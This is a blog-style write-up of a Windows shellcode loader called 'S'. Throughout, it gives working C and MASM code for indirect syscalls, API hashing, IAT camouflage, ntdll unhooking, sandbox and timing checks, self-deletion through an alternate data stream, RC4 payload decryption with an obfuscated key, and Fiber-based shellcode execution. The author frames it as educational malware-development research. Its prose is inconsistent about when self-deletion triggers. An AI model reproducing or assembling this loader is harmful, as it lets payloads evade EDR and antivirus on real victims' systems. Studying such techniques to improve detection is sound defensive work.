---
title: "S — Layered Evasion Framework"
date: 2026-05-13
tags: ["windows", "maldev", "evasion", "syscalls", "injection", "internals", "anti-analysis"]
summary: "A multi-layered evasion framework combining Hell's Hall indirect syscalls, PEB-based API hashing, IAT camouflage, custom CRT removal, ntdll unhooking via KnownDlls, sandbox detection, self-deletion, and Fiber-based shellcode execution — built to understand and demonstrate how modern offensive tooling evades EDR/AV at every layer."
---

## Introduction

**S** is a research project I built to study and chain together multiple evasion techniques that are independently well-documented but rarely seen combined in a single, coherent codebase. The goal was not to build a production implant, but to deeply understand **why** each technique works, how they interact, and what happens at the assembly level when you bypass the standard Windows API layer entirely. At this point, i would say that Maldev Academy is the best course you can find.

The result is a compact C/MASM x64 loader that combines:

- **Hell's Hall** — indirect syscalls with hook-aware SSN resolution
- **PEB-based API hashing** — custom `GetProcAddress` / `GetModuleHandle` via CRC32
- **IAT Camouflage** — dead-code pollution to confuse static import analysis
- **Custom CRT** — no msvcrt.dll dependency, all standard functions reimplemented
- **ntdll Unhooking** — clean `.text` restoration from `\KnownDlls\ntdll.dll`
- **Sandbox Detection** — USB presence, CPU core count, RAM threshold, timing check
- **Self-Deletion** — NTFS ADS rename + POSIX-semantics delete
- **RC4 with Obfuscated Key** — `SystemFunction032` + brute-forced hint-byte key
- **Fiber Execution** — shellcode run through Windows Fibers instead of threads

---

## Technique 1 — Hell's Hall (Indirect Syscalls)

### What Are Syscalls and Why They Matter

Every Windows API call that touches the kernel eventually reaches an NT function in `ntdll.dll`. Inside ntdll, each function has a **syscall stub** that looks like this:

```asm
NtCreateSection:
    mov r10, rcx          ; Windows calling convention requirement
    mov eax, 0x4A         ; SSN (System Service Number)
    test byte ptr [SharedUserData+0x308], 1
    jne  0x...
    syscall               ; ring 3 → ring 0 transition
    ret
```

The `syscall` instruction is the actual kernel entry point. The `SSN` (the number in `eax`) tells the kernel **which system call to dispatch**.

EDR products work by **hooking** these stubs: they overwrite the first bytes with a `JMP` to their own monitoring code (`0xE9 xx xx xx xx`). Every time you call `NtCreateSection`, the EDR intercepts it first.

**Indirect syscalls** bypass this by:
1. Resolving the correct SSN without relying on hooked stubs
2. Executing the `syscall` instruction borrowed from a **different, clean** ntdll function

This means the `syscall` instruction visible in call stacks and ETW traces points inside ntdll (legitimate), not into your code.

### SSN Resolution — Halo's Gate Logic

The implementation in `HellsHall.c` starts by walking the **PEB** to find ntdll's export directory without calling any Win32 API:

```c
PPEB pPeb = (PPEB)__readgsqword(0x60);  // GS register points to TEB; +0x60 is PEB

// Walk InMemoryOrderModuleList: [0]=self, [1]=ntdll.dll
PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)(
    (PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10
);
ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);  // ntdll base address
```

Once the export directory is located, each export name is hashed with CRC32 and compared against the target hash. When the function is found:

**Case 1 — Unhooked stub** (bytes `4C 8B D1 B8 ?? ?? 00 00`):

```c
if (*((PBYTE)pFuncAddress)     == 0x4C &&  // mov r10, rcx
    *((PBYTE)pFuncAddress + 1) == 0x8B &&
    *((PBYTE)pFuncAddress + 2) == 0xD1 &&
    *((PBYTE)pFuncAddress + 3) == 0xB8 &&  // mov eax, <SSN>
    *((PBYTE)pFuncAddress + 6) == 0x00 &&
    *((PBYTE)pFuncAddress + 7) == 0x00) {

    BYTE high = *((PBYTE)pFuncAddress + 5);
    BYTE low  = *((PBYTE)pFuncAddress + 4);
    pNtSys->dwSSn = (high << 8) | low;  // extract SSN directly
}
```

**Case 2 — Hooked stub** (first byte is `0xE9` = JMP):

The EDR has replaced the stub with a jump. The SSN is gone. The trick: **syscall numbers are assigned sequentially** at boot time. If `NtCreateSection` is SSN `0x4A`, then the function immediately above it in the sorted export table is `0x49`, and below it is `0x4B`.

The code scans neighboring functions (up to 255 positions, stepping ±32 bytes = average stub size) until it finds an **unhooked neighbor**, then infers the target SSN by adjusting the neighbor's SSN by the distance:

```c
// Scenario 1: JMP at byte 0
if (*((PBYTE)pFuncAddress) == 0xE9) {
    for (WORD idx = 1; idx <= 0xFF; idx++) {
        // Look DOWN (positive offset)
        if (neighborDown has valid stub pattern) {
            pNtSys->dwSSn = neighborDownSSN - idx;
            break;
        }
        // Look UP (negative offset)
        if (neighborUp has valid stub pattern) {
            pNtSys->dwSSn = neighborUpSSN + idx;
            break;
        }
    }
}
// Scenario 2: JMP at byte 3 (hook after "mov r10, rcx")
if (*((PBYTE)pFuncAddress + 3) == 0xE9) { ... }
```

### The Indirect Syscall Trampoline

After resolving the SSN, the code finds a **legitimate `syscall` instruction** inside another ntdll function to use as the trampoline:

```c
// Start 255 bytes past the target function address
ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

// Scan for the 0F 05 opcodes (syscall instruction)
for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
    if (*((PBYTE)uFuncAddress + z) == 0x0F &&
        *((PBYTE)uFuncAddress + x) == 0x05) {
        pNtSys->pSyscallInstAddress = (ULONG_PTR)uFuncAddress + z;
        break;
    }
}
```

The MASM assembly in `HellsAsm.asm` implements the actual call mechanism:

```asm
.data
    wSystemCall         DWORD 0h       ; SSN to use
    qSyscallInsAdress   QWORD 0h       ; address of borrowed 'syscall' instruction

.code

SetSSn proc
    xor eax, eax
    mov wSystemCall, eax
    mov qSyscallInsAdress, rax
    mov eax, ecx                       ; ecx = SSN (first argument)
    mov wSystemCall, eax
    mov r8, rdx                        ; rdx = pSyscallInstAddress (second argument)
    mov qSyscallInsAdress, r8
    ret
SetSSn endp

RunSyscall proc
    xor r10, r10
    mov rax, rcx
    mov r10, rax                       ; r10 = rcx (Windows syscall ABI)
    mov eax, wSystemCall               ; eax = SSN
    jmp Run
    ; dead bytes — compiler thinks they're reachable, they are not
    xor eax, eax
    xor rcx, rcx
    shl r10, 2
  Run:
    jmp qword ptr [qSyscallInsAdress]  ; jump into ntdll's own 'syscall' instruction
    xor r10, r10
    mov qSyscallInsAdress, r10
    ret
RunSyscall endp
```

**Usage at call site:**

```c
// Set SSN + trampoline address
SET_SYSCALL(g_Nt.NtCreateSection);
// #define SET_SYSCALL(NtSys) SetSSn((DWORD)NtSys.dwSSn, (PVOID)NtSys.pSyscallInstAddress)

// Call with actual arguments
STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize,
                    PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
```

The result: the kernel sees a legitimate `syscall` originating from inside ntdll. No EDR hook is touched. The call stack is clean.

---

## Technique 2 — PEB-Based API Hashing

### Why Avoid `GetProcAddress` / `GetModuleHandle`

Both functions are trivially hookable Win32 APIs. More importantly, any call to `GetProcAddress(hMod, "NtCreateSection")` creates a string reference to `"NtCreateSection"` in your binary — plaintext evidence of intent visible to any static scanner.

### CRC32 Hashing

All API and module names are replaced with their pre-computed CRC32 hashes at compile time:

```c
#define SEED 0xEDB77220  // custom polynomial seed

unsigned int crc32b(char* str) {
    unsigned int byte, mask, crc = 0xFFFFFFFF;
    int i = 0, j = 0;
    while (str[i] != 0) {
        byte = str[i];
        crc = crc ^ byte;
        for (j = 7; j >= 0; j--) {
            mask = -1 * (crc & 1);
            crc = (crc >> 1) ^ (SEED & mask);
        }
        i++;
    }
    return ~crc;
}

#define HASH(API) (crc32b((char*)API))
```

No string `"NtCreateSection"` appears in the binary. Instead:

```c
#define NtCreateSection_CRC32    0x7F4737B6
#define KERNEL32DLL_CRC32        0x1E337B8C
```

### Custom `GetModuleHandle` — Walking the PEB LDR

```c
HMODULE GetModuleHandleReplacement(IN DWORD dwModuleNameHash) {
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
    PPEB_LDR_DATA pLdr = pPeb->LoaderData;
    PLDR_DATA_TABLE_ENTRY pDte = pLdr->InMemoryOrderModuleList.Flink;

    while (pDte) {
        if (pDte->FullDllName.Length != NULL &&
            pDte->FullDllName.Length < MAX_PATH) {

            // Uppercase the DLL name for consistent hashing
            CHAR UpperCaseDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';

            if (HASH(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}
```

### Custom `GetProcAddress` — Parsing the PE Export Directory

```c
FARPROC GetProcAddr(IN HMODULE hModule, DWORD dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;

    // Parse PE headers manually
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        pBase + pImgNtHdrs->OptionalHeader
               .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD FunctionNameArray    = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD) (pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        CHAR* pFunctionName    = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == HASH(pFunctionName))
            return pFunctionAddress;
    }
    return NULL;
}
```

No call to `LoadLibrary`, `GetModuleHandle`, or `GetProcAddress` appears in the binary for sensitive APIs. The entire resolution chain is self-contained.

---

## Technique 3 — IAT Camouflage

### The Problem With an Empty or Suspicious IAT

Static analysis tools inspect the **Import Address Table (IAT)** of a PE binary. A binary that imports only `HeapAlloc` and nothing else is immediately suspicious. A binary with no imports at all is even more suspicious.

### Dead-Code IAT Pollution

The `ANormalFunctionForNormalFunctions()` function in `IatCamo.h` is called at startup but is designed to **never execute** its inner block:

```c
int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
        __TIME__[7] * 1  + __TIME__[6] * 10  +
        __TIME__[4] * 60 + __TIME__[3] * 600 +
        __TIME__[1] * 3600 + __TIME__[0] * 36000;
}

VOID ANormalFunctionForNormalFunctions() {
    PVOID pAddress = NULL;
    int* A = (int*)Helper(&pAddress);
    // RandomCompileTimeSeed() % 0xFF is always 0..254 — never > 350
    if (*A > 350) {
        // Dead code: never reached at runtime
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = (signed __int64)IsTextUnicode(NULL, 0, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }
    HeapFree(GetProcessHeap(), 0, pAddress);
}
```

The `if (*A > 350)` condition uses a **compile-time seed** derived from `__TIME__` (the build timestamp). The result modulo 255 is always in range [0, 254] — always less than 350. The block is syntactically present, the compiler imports all those functions into the IAT, but no instruction inside the block ever runs.

**What the static scanner sees:**

```
IAT imports: MessageBoxA, GetLastError, IsTextUnicode, RegisterClassW,
             GetWindowLongPtrW, IsWindowVisible, MultiByteToWideChar...
```

These are common, whitelisted UI-management APIs. The real suspicious calls (section creation, memory mapping) happen through indirect syscalls — completely absent from the IAT.

---

## Technique 4 — Custom CRT (No msvcrt.dll)

### Why Remove the CRT Dependency

Linking against the C runtime (`msvcrt.dll` or the UCRT) adds:
- Visible import entries in the IAT
- CRT initialization code in the binary
- A known binary fingerprint that scanners recognize
- Startup overhead (CRT init, atexit registration, etc.)

`CustomCrt.h` reimplements every CRT function used in the project as inline functions:

```c
// strlen
static inline SIZE_T custom_strlen(LPCSTR str) {
    SIZE_T len = 0;
    while (str[len] != '\0') len++;
    return len;
}

// memcpy — byte-by-byte to avoid compiler replacing with CRT call
static inline PVOID custom_memcpy(PVOID dest, CONST VOID* src, SIZE_T count) {
    PBYTE d = (PBYTE)dest;
    CONST BYTE* s = (CONST BYTE*)src;
    while (count--) *d++ = *s++;
    return dest;
}

// Macro overrides: replace every standard name with custom_ version
#define memcpy   custom_memcpy
#define strlen   custom_strlen
#define toupper  custom_toupper
// etc.
```

`runtime.c` provides the two symbols the MSVC linker always requires, even with `/NODEFAULTLIB`:

```c
float _fltused = 0;  // required when any float arithmetic is present

void* __cdecl memset(void* Destination, int Value, size_t Size) {
    unsigned char* p = (unsigned char*)Destination;
    while (Size > 0) { *p++ = (unsigned char)Value; Size--; }
    return Destination;
}
```

`printf` is conditionally compiled:

```c
#if DEBUG_MODE
    // Debug builds: real output via WriteConsoleA (no printf import)
    static inline VOID DbgPrint(LPCSTR format, ...) {
        CHAR buffer[1024];
        va_list args;
        va_start(args, format);
        INT written = wvsprintfA(buffer, format, args);
        va_end(args);
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD dwWritten;
        WriteConsoleA(hConsole, buffer, written, &dwWritten, NULL);
    }
    #define printf DbgPrint
#else
    // Release builds: printf disappears entirely
    #define printf(format, ...) ((void)0)
#endif
```

In Release builds, all `printf` calls compile to nothing — zero output, zero import.

---

## Technique 5 — ntdll Unhooking via KnownDlls

### The Problem: EDR Hooks in ntdll

When a process starts, Windows loads `ntdll.dll` from disk. EDR products inject a DLL early in process creation and **overwrite** syscall stubs in the already-mapped ntdll with JMP instructions to their monitoring code. Even indirect syscalls resolve SSNs from this hooked copy.

For the unhooking step itself to work, you need to use syscalls that are **already resolved before the hook is present**, or that you can call safely despite the hook.

### Loading a Clean Copy From `\KnownDlls\`

The Windows Session Manager (`smss.exe`) maintains a set of pre-mapped, kernel-level section objects under `\KnownDlls\`. These are **read-only, kernel-maintained** copies of critical DLLs. EDR products cannot hook what they do not control.

**Step 1 — Open the KnownDlls ntdll section:**

```c
BOOL AtreeAndAnApple(OUT PVOID* ppNtdllBuf) {
    UNICODE_STRING UniStr = { 0 };
    OBJECT_ATTRIBUTES ObjAttr = { 0 };

    // L"\\KnownDlls\\ntdll.dll"
    UniStr.Buffer = (PWSTR)NTDLL;
    UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
    UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&ObjAttr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Indirect syscall — SSN resolved before unhooking
    SET_SYSCALL(g_Nt.NtOpenSection);
    RunSyscall(&hSection, SECTION_MAP_READ, &ObjAttr);

    // Map the clean ntdll into our address space (read-only)
    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    *ppNtdllBuf = pNtdllBuffer;
}
```

**Step 2 — Get the hooked ntdll base from the PEB:**

```c
PVOID FetchLocalNtdllBA() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)(
        (PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10
    );
    return pLdr->DllBase;  // currently loaded (hooked) ntdll
}
```

**Step 3 — Overwrite the hooked `.text` section with the clean copy:**

```c
BOOL FromOneToTwo(IN PVOID pUnhookedDll) {
    PVOID pLocalNtdll = FetchLocalNtdllBA();

    // Find the .text section in both copies
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pImgNtHDR);
    for (int i = 0; i < pImgNtHDR->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            // 'xet.' == '.tex' in little-endian
            pLocalHNtdllTxt   = (PVOID)((ULONG_PTR)pLocalNtdll    + pSectionHeader[i].VirtualAddress);
            pRemoteUHntdllTxt = (PVOID)((ULONG_PTR)pUnhookedDll   + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize     = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    // Make the hooked .text section writable (via indirect syscall)
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    RunSyscall((HANDLE)-1, &pLocalHNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOld);

    // Overwrite hooked stubs with clean originals
    memcpy(pLocalHNtdllTxt, pRemoteUHntdllTxt, sNtdllTxtSize);

    // Restore original memory protections
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    RunSyscall((HANDLE)-1, &pLocalHNtdllTxt, &sNtdllTxtSize, dwOld, &dwOld);
}
```

After this step, all EDR hooks in ntdll are gone. The `.text` section matches the kernel's clean version byte-for-byte. Any subsequent NT API call goes directly to the kernel.

---

## Technique 6 — Sandbox Detection (Anti-Analysis)

The `IthinkIsItIsWhatItIs()` function in `AntiAnalysis.c` runs three hardware-fingerprint checks before any payload activity:

### Check 1 — USB Device Count

VMs typically have zero physical USB storage devices connected. The registry key `SYSTEM\ControlSet001\Enum\USBSTOR` lists every USB storage device ever seen. If none exist, the environment is likely virtual:

```c
a_Hs.pRegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SYSTEM\\ControlSet001\\Enum\\USBSTOR",
    NULL, KEY_READ, &hKey);

a_Hs.pRegQueryInfoKeyA(hKey, NULL, NULL, NULL,
    &dwUsbNumber, ...);  // dwUsbNumber = subkey count = device count

if (dwUsbNumber < 1)
    return TRUE;  // sandboxed
```

### Check 2 — CPU Core Count

Hypervisors commonly allocate 1 or 2 vCPUs. Real analyst machines (and developer workstations) typically have 4 or more:

```c
SYSTEM_INFO SysInfo = { 0 };
a_Hs.pGetSystemInfo(&SysInfo);
if (SysInfo.dwNumberOfProcessors < 4)
    return TRUE;
```

### Check 3 — Physical RAM

Sandbox VMs are commonly provisioned with 2–4 GB of RAM to conserve host resources. Real machines have at least 8 GB:

```c
MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };
a_Hs.pGlobalMemoryStatusEx(&MemStatus);
if (MemStatus.ullTotalPhys < (ULONGLONG)(8ULL * 1024 * 1024 * 1024))
    return TRUE;
```

### Timing Check — `NtDelayExecution` Validation

Many sandbox engines **fast-forward** or **skip** sleep calls to accelerate analysis. The `WhatASunnyDay()` function uses `NtDelayExecution` (a native NT API, harder to patch than `Sleep`) and validates that real time actually passed:

Attention: For testing purpose the time is less than 1 minute, it must be more than 2 minutes.

```c
BOOL WhatASunnyDay(FLOAT ftMinutes) {
    DWORD dwMilliSeconds = ftMinutes * 60000;  // 0.1 min = 6 seconds
    LARGE_INTEGER DelayInterval;
    DelayInterval.QuadPart = -(LONGLONG)(dwMilliSeconds * 10000);  // 100-ns units

    DWORD _T0 = a_Hs.pGetTickCount64();

    // Suspend via NT API instead of Sleep()
    pNtDelayExecution(FALSE, &DelayInterval);

    DWORD _T1 = a_Hs.pGetTickCount64();

    // If less time than expected passed, sandbox skipped the sleep
    if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
        return FALSE;

    return TRUE;
}
```

All anti-analysis APIs (`RegOpenKeyExA`, `GetSystemInfo`, `GlobalMemoryStatusEx`, `GetTickCount64`) are resolved via the custom hashing API — no string references in the binary.

---

## Technique 7 — Self-Deletion via NTFS Alternate Data Streams

If sandbox checks pass (indicating a real environment — paradoxically the trigger for the anti-forensics payload), the binary deletes itself from disk while still running.

The technique abuses **NTFS Alternate Data Streams (ADS)** and **POSIX-semantics deletion**:

```c
BOOL AgainALake() {
    // 1. Get the binary's own path
    a_Hs.pGetModuleFileNameW(NULL, szFileName, MAX_PATH * 2);

    // 2. Generate a random ADS name like ":a3f27b8c9d1e"
    WCHAR szNewStream[7] = L":%x%x\x00";
    swprintf(FileRenameInfo_2.FileName, MAX_PATH, szNewStream,
             rdrand32(), rdrand32());  // RDRAND hardware random

    // 3. Open the file with DELETE access
    hLocalImgFileHandle = a_Hs.pCreateFileW(szFileName,
        DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, NULL, NULL);

    // 4. Rename the file to an ADS (e.g., malware.exe → malware.exe:a3f2...)
    //    This makes the primary file "empty" — no content visible to Explorer/AV
    a_Hs.pSetFileInformationByHandle(hLocalImgFileHandle,
        FileRenameInfo, &FileRenameInfo_2, sizeof(FILE_RENAME_INFO2));

    CloseHandle(hLocalImgFileHandle);

    // 5. Re-open the renamed file
    hLocalImgFileHandle = a_Hs.pCreateFileW(szFileName, DELETE | SYNCHRONIZE, ...);

    // 6. Mark for deletion with POSIX semantics (delete even if file handle is open)
    FileDisposalInfoEx.Flags = FILE_DISPOSITION_FLAG_DELETE |
                               FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
    a_Hs.pSetFileInformationByHandle(hLocalImgFileHandle,
        FileDispositionInfoEx, &FileDisposalInfoEx, sizeof(FILE_DISPOSITION_INFO_EX));

    CloseHandle(hLocalImgFileHandle);
}
```

**Why this works:**

- Standard `DeleteFile` cannot delete a running executable (file is locked by the OS image loader)
- The ADS rename moves all file content into a hidden stream — the primary file appears empty immediately
- `FILE_DISPOSITION_FLAG_POSIX_SEMANTICS` marks the inode for deletion the moment all handles close, even while the process is still running
- When the process terminates, the OS closes the last handle and the file entry is removed

The result: no file on disk, no recovery from Recycle Bin, executed from memory.

---

## Technique 8 — RC4 Decryption with Obfuscated Key

### Why SystemFunction032

`SystemFunction032` is an **undocumented Windows API** in `Advapi32.dll` that implements RC4. Using it means:
- No custom crypto code in the binary
- No suspicious cipher-looking loops in disassembly
- The decryption happens inside a legitimate Microsoft DLL

### Key Obfuscation — Brute-Forced Hint Byte

The RC4 key is not stored in plaintext. It is stored as an obfuscated blob where each byte is `(realKey[i] ^ b) - i` for a secret `b`. To recover `b`, the code brute-forces a **known hint byte**:

```c
BOOL RenamedApplePen(IN PBYTE pRc4Key, IN PBYTE pPayloadData,
                     IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    BYTE RealKey[KEY_SIZE] = { 0 };
    int b = 0;

    // Brute-force 'b': we know that (pRc4Key[0] ^ b) - 0 == HINT_INJ_BYTE (0xB6)
    while (1) {
        if (((pRc4Key[0] ^ b) - 0) == HINT_INJ_BYTE)
            break;
        b++;
    }

    // Reconstruct the real key
    for (int i = 0; i < KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // Decrypt with SystemFunction032
    USTRING Key = { .Buffer = RealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize };
    USTRING Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)
        GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    SystemFunction032(&Img, &Key);
}
```

**What is stored in the binary:**

```c
unsigned char ProtectedKey[] = {
    0x58, 0xB4, 0xE7, 0x82, 0x97, 0x81, 0xDF, 0xAD,
    0x68, 0xE5, 0x7B, 0x1C, 0x86, 0xF3, 0x58, 0xE6
};
```

No plaintext key. A static reverse engineer must understand the `b`-brute-force logic to reconstruct it. The hint byte (`0xB6`) is a compile-time constant that anchors the brute-force — without it, there is no known plaintext to anchor on.

---

## Technique 9 — Fiber-Based Shellcode Execution

### Why Fibers Instead of Threads

Thread creation (`CreateThread`, `CreateRemoteThread`) is among the most heavily monitored Windows primitives. EDR products hook `NtCreateThread`, watch for threads starting in RWX or unbacked memory, and analyze thread start addresses.

**Windows Fibers** are a cooperative multitasking primitive — a fiber is a user-mode scheduled execution context. The OS scheduler is not involved. From the kernel's perspective, there is **only one thread** running.

```c
BOOL IamRobot(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    // 1. Create a shared section (RWX) via indirect syscall
    SET_SYSCALL(g_Nt.NtCreateSection);
    RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize,
               PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // 2. Map the section into the current process
    SET_SYSCALL(g_Nt.NtMapViewOfSection);
    RunSyscall(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL,
               &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);

    // 3. Copy decrypted shellcode into the mapped memory
    memcpy(pLocalAddress, pPayload, sPayloadSize);

    // 4. Create a Fiber with the shellcode as entry point
    LPVOID ShellcodeFiberAddr = a_Hs.pCreateFiber(
        0x00,
        (LPFIBER_START_ROUTINE)pLocalAddress,
        NULL
    );

    // 5. Convert the current thread to a Fiber (required before switching)
    LPVOID PrimaryFiberAddr = a_Hs.pConvertThreadToFiber(NULL);

    // 6. Switch execution to the shellcode Fiber
    a_Hs.pSwitchToFiber(ShellcodeFiberAddr);

    return 0;
}
```

**Why `NtCreateSection` + `NtMapViewOfSection` instead of `VirtualAlloc`:**

- `VirtualAlloc` with `MEM_COMMIT | PAGE_EXECUTE_READWRITE` is a classic detection tripwire
- Section objects are a lower-level, less-monitored allocation primitive
- The same section could be mapped into multiple processes (useful for cross-process injection)
- All calls go through the indirect syscall trampoline — no EDR hook is touched

---

## Complete Execution Flow

```
┌──────────────────────────────────────────────────────────┐
│ 1. IAT CAMOUFLAGE                                        │
│    ANormalFunctionForNormalFunctions()                    │
│    Dead code populates IAT with benign APIs              │
│    Condition never true — code never executes            │
└──────────────────────────────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────┐
│ 2. API HASHING INITIALIZATION                            │
│    LetsGoWithThem()                                      │
│    Walk PEB → find kernel32.dll, advapi32.dll            │
│    Resolve all APIs via CRC32 hash matching              │
│    No GetProcAddress, no string references               │
└──────────────────────────────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────┐
│ 3. TIMING CHECK                                          │
│    WhatASunnyDay(0.1)                                    │
│    NtDelayExecution for 6 seconds                        │
│    Verify real time elapsed — kill if sandbox fast-fwd   │
└──────────────────────────────────────────────────────────┘
                          │
              ┌───────────┴───────────┐
              │ Sandbox detected?     │
              ▼                       ▼
┌─────────────────────┐  ┌───────────────────────────────┐
│ SELF-DELETE         │  │ 4. SANDBOX CHECKS             │
│ AgainALake()        │  │    IthinkIsItIsWhatItIs()     │
│ Rename to ADS       │  │    USB count < 1 → VM         │
│ POSIX delete mark   │  │    CPU cores < 4 → VM         │
│ Exit                │  │    RAM < 8GB → VM             │
└─────────────────────┘  └───────────────────────────────┘
                                        │ Real machine
                                        ▼
                          ┌──────────────────────────────────────┐
                          │ 5. INDIRECT SYSCALL INIT             │
                          │    NormalRaceForMarioKart()           │
                          │    Resolve SSNs for 7 NT functions    │
                          │    Hell's Hall + Halo's Gate          │
                          └──────────────────────────────────────┘
                                        │
                                        ▼
                          ┌──────────────────────────────────────┐
                          │ 6. NTDLL UNHOOKING                   │
                          │    AtreeAndAnApple() → KnownDlls     │
                          │    FromOneToTwo() → overwrite .text   │
                          │    NtUnmapViewOfSection → cleanup     │
                          └──────────────────────────────────────┘
                                        │
                                        ▼
                          ┌──────────────────────────────────────┐
                          │ 7. RC4 DECRYPTION                    │
                          │    RenamedApplePen()                  │
                          │    Brute-force 'b' from hint byte     │
                          │    Reconstruct real key               │
                          │    SystemFunction032 decrypts payload  │
                          └──────────────────────────────────────┘
                                        │
                                        ▼
                          ┌──────────────────────────────────────┐
                          │ 8. FIBER EXECUTION                   │
                          │    IamRobot()                         │
                          │    NtCreateSection (indirect)         │
                          │    NtMapViewOfSection (indirect)      │
                          │    memcpy shellcode                   │
                          │    CreateFiber → SwitchToFiber        │
                          └──────────────────────────────────────┘
```

---

## Techniques Summary

| Technique | Layer Addressed | What It Defeats |
|-----------|-----------------|-----------------|
| **Hell's Hall — Indirect Syscalls** | Kernel boundary | EDR hooks on ntdll stubs; userland call stack analysis |
| **Halo's Gate SSN Inference** | Syscall resolution | Hooked stubs that hide SSN values |
| **PEB Walking + CRC32 Hashing** | Import resolution | String-based import detection; `GetProcAddress` hooks |
| **IAT Camouflage** | Static analysis | Import table scans looking for suspicious APIs |
| **Custom CRT** | Binary footprint | CRT-based detection; msvcrt.dll import signatures |
| **ntdll Unhooking via KnownDlls** | Runtime hooks | EDR-injected JMP hooks in ntdll .text section |
| **USB / CPU / RAM checks** | Sandbox detection | Automated sandbox execution |
| **NtDelayExecution timing check** | Sandbox detection | Sandbox time acceleration / sleep skipping |
| **NTFS ADS Self-Delete** | Post-execution forensics | File recovery, disk artifact analysis |
| **RC4 + Hint-Byte Key Obfuscation** | Payload analysis | Static signature detection; key extraction |
| **Fiber-based Execution** | Thread monitoring | Thread creation hooks; unbacked memory thread start alerts |
| **NtCreateSection + NtMapViewOfSection** | Memory allocation | VirtualAlloc/RWX allocation hooks and heuristics |

---

> *This project was developed for educational purposes and authorized security research only. All techniques documented here reflect concepts studied during MALDEV training and personal lab research. Do not use against systems you do not own or have explicit authorization to test.*
